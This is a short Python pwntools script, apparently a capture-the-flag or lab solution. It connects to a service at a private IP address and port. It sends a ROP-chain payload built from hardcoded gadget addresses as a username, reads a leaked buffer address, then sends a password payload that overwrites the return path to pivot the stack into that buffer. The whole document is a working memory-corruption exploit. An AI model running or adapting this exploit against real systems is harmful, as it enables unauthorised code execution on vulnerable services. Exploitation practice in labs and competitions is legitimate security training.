from pwn import *
from pwnlib import *

payload1 = p64(0)
payload1 += p64(0x004012f4)
payload1 += p64(0x80000000)
payload1 += p64(0x004012f6)
payload1 += p64(0x00402008)
payload1 += p64(0x004012f8)
payload1 += p64(0x7fffffff)
payload1 += p64(0x004012f9) 
payload1 += p64(0x004011a6)
payload1 = payload1.ljust(127, b'\x00')

payload2 = b'A' * 8;

io = remote('10.21.232.209', 5004)
io.recvuntil(b'username:')
io.send(payload1)
io.recvuntil(b'hi')
buf1_adr = int(io.recvline().strip(), 16)

io.recvuntil(b'password:')
payload2 += p64(buf1_adr)
payload2 += p64(0x0040128d)
io.send(payload2)
print(io.recvall().decode())
